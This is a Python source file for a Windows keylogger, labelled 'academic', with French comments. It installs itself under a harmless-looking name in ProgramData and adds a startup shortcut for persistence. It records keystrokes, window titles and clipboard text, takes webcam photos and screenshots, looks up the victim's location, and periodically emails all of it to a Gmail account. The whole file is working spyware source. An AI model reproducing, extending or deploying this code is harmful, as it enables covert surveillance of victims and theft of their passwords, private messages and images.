import os
import sys
import json
import time
import threading
import platform
import getpass
import socket
import pyperclip
import smtplib
import requests
import shutil
import subprocess
import cv2
import pyautogui
import win32gui
import win32com.client
import tkinter as tk
from tkinter import messagebox
from email.message import EmailMessage
from pynput.keyboard import Listener, Key, KeyCode
import signal
import ctypes  # ajout pour admin check
def get_resource_path(relative_path):
    """Retourne le chemin absolu au fichier empaqueté avec PyInstaller."""
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)
# === CONST ===
CONFIG_FILE = "config.json"
PID_FILE = "pid.txt"
STARTUP_SHORTCUT_NAME = "Academic.lnk"  # renommé
LOG_FILE = os.path.expanduser("~/.keylog.txt")
CAM_IMAGE = os.path.expanduser("~/.cam.jpg")
SCREENSHOT_FILE = os.path.expanduser("~/.screenshot.jpg")
INSTALL_NAME = "Academic.exe"
CONFIG_DIR = r"C:\ProgramData\Academic"  # dossier d'installation

exit_keys = {Key.ctrl_l, Key.shift, KeyCode(char='q')}

# === ADMIN CHECK ===
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    print("Veuillez relancer ce programme en mode administrateur.")
    sys.exit(1)

# === FONCTIONS DE COPIE DANS LE DOSSIER INSTALL ===
def copy_self_to_install_dir():
    try:
        if not os.path.exists(CONFIG_DIR):
            os.makedirs(CONFIG_DIR)
        src = os.path.abspath(sys.argv[0])
        dst = os.path.join(CONFIG_DIR, INSTALL_NAME)
        if not os.path.exists(dst):
            shutil.copy2(src, dst)
            print(f"[+] Copied to install dir: {dst}")
        else:
            print("[*] Already copied in install dir.")
    except Exception as e:
        print(f"[Error copying to install dir]: {e}")

def copy_interface_py():
    try:
        if not os.path.exists(CONFIG_DIR):
            os.makedirs(CONFIG_DIR)
        src = os.path.abspath("interface.py")
        dst = os.path.join(CONFIG_DIR, "interface.py")
        if not os.path.exists(dst):
            shutil.copy2(src, dst)
            print("[+] interface.py copied to install dir.")
        else:
            print("[*] interface.py already exists in install dir.")
    except Exception as e:
        print(f"[Error copying interface.py]: {e}")

# === STARTUP INSTALLATION ===
def install_to_startup():
    try:
        startup_dir = os.path.join(
            os.environ["PROGRAMDATA"],
            r"Microsoft\Windows\Start Menu\Programs\StartUp"
        )
        shortcut_path = os.path.join(startup_dir, STARTUP_SHORTCUT_NAME)
        if not os.path.exists(shortcut_path):
            python_exe = os.path.join(CONFIG_DIR, INSTALL_NAME)
            shell = win32com.client.Dispatch("WScript.Shell")
            shortcut = shell.CreateShortCut(shortcut_path)
            shortcut.Targetpath = python_exe
            shortcut.WorkingDirectory = CONFIG_DIR
            shortcut.IconLocation = python_exe
            shortcut.save()
            print(f"[*] Shortcut created in startup: {shortcut_path}")
        else:
            print("[*] Shortcut already in startup.")
    except Exception as e:
        print(f"[Startup Error]: {e}")

# === CONFIGURATION ===
CONFIG_FILE = get_resource_path("config.json")

def load_config():
    default_config = {
        "email": "your_email@gmail.com",
        "password": "your_app_password",
        "send_interval": 60
    }
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            config = json.load(f)
        for key, value in default_config.items():
            if key not in config:
                config[key] = value
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=4)
        return config
    else:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(default_config, f, indent=4)
        return default_config

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)

config = load_config()
EMAIL_ADDRESS = config["email"]
EMAIL_PASSWORD = config["password"]
SEND_INTERVAL = config["send_interval"]

# === UTILITIES ===
def write_log(data):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(data)
    except Exception as e:
        print(f"[Write Log Error]: {e}")

def get_active_window_title():
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except:
        return "Unknown Window"

def capture_image():
    try:
        cam = cv2.VideoCapture(0)
        if cam.isOpened():
            ret, frame = cam.read()
            if ret:
                cv2.imwrite(CAM_IMAGE, frame)
            cam.release()
            cv2.destroyAllWindows()
    except Exception as e:
        print(f"[Camera Error]: {e}")

def capture_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save(SCREENSHOT_FILE)
    except Exception as e:
        print(f"[Screenshot Error]: {e}")

def get_geo_location():
    try:
        response = requests.get("https://ipinfo.io/json")
        if response.status_code == 200:
            data = response.json()
            return f"{data.get('city', '')}, {data.get('region', '')}, {data.get('country', '')} (GPS: {data.get('loc', '')})"
        else:
            return "Geo info unavailable"
    except Exception as e:
        return f"Geo info error: {e}"

def send_email():
    try:
        capture_image()
        capture_screenshot()
        if not os.path.exists(LOG_FILE):
            return
        with open(LOG_FILE, "rb") as f:
            data = f.read()
        if not data:
            return

        msg = EmailMessage()
        msg["Subject"] = f"\U0001F4CA Keylogger Report - {platform.node()}"
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS

        msg.set_content(f"""
Machine: {platform.node()}
IP: {socket.gethostbyname(socket.gethostname())}
Location: {get_geo_location()}
        """)
        msg.add_attachment(data, maintype='text', subtype='plain', filename="keylog.txt")

        if os.path.exists(CAM_IMAGE):
            with open(CAM_IMAGE, "rb") as img:
                msg.add_attachment(img.read(), maintype='image', subtype='jpeg', filename="cam.jpg")

        if os.path.exists(SCREENSHOT_FILE):
            with open(SCREENSHOT_FILE, "rb") as img:
                msg.add_attachment(img.read(), maintype='image', subtype='jpeg', filename="screenshot.jpg")

        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            smtp.send_message(msg)

        open(LOG_FILE, "w").close()

    except Exception as e:
        print(f"[Email Error]: {e}")

# === BACKGROUND THREADS ===
def flush_log_buffer_periodically():
    global log_buffer
    while True:
        time.sleep(60)
        if log_buffer:
            write_log(log_buffer)
            log_buffer = ""

def monitor_clipboard():
    global last_clipboard
    while True:
        try:
            current = pyperclip.paste()
            if current != last_clipboard:
                last_clipboard = current
                write_log(f"\n[CLIPBOARD] {current}\n")
        except:
            pass
        time.sleep(5)

def schedule_email():
    while True:
        time.sleep(SEND_INTERVAL)
        send_email()

# === KEYLOGGER CORE ===
log_buffer = ""
pressed_keys = set()
last_window = ""
last_clipboard = ""

def on_press(key):
    global log_buffer, pressed_keys, last_window

    pressed_keys.add(key)
    if exit_keys.issubset(pressed_keys):
        print("[!] Stopping keylogger...")
        os._exit(0)

    # Raccourci Ctrl+Alt+F6
    if Key.ctrl_l in pressed_keys and Key.alt_l in pressed_keys and key == Key.f6:
        open_dashboard()

    try:
        window = get_active_window_title()
        if window != last_window:
            last_window = window
            write_log(f"\n[WINDOW] {window}\n")
            capture_screenshot()

        if hasattr(key, 'char') and key.char is not None:
            log_buffer += key.char
        else:
            log_buffer += f" [{str(key)}] "
    except Exception as e:
        print(f"[Key Error]: {e}")

def on_release(key):
    if key in pressed_keys:
        pressed_keys.remove(key)

def open_dashboard():
    try:
        # On lance l'interface depuis le dossier installé
        interface_path = os.path.join(CONFIG_DIR, "interface.py")
        python_executable = sys.executable
        subprocess.Popen([python_executable, interface_path])
    except Exception as e:
        print(f"[Dashboard Error]: {e}")

# === MAIN FUNCTION ===
def main():
    copy_self_to_install_dir()
    copy_interface_py()
    install_to_startup()

    with open(PID_FILE, "w") as f:
        f.write(str(os.getpid()))

    print("[*] Starting academic keylogger...")

    # Background services
    threading.Thread(target=flush_log_buffer_periodically, daemon=True).start()
    threading.Thread(target=monitor_clipboard, daemon=True).start()
    threading.Thread(target=schedule_email, daemon=True).start()

    # Start keylogger
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
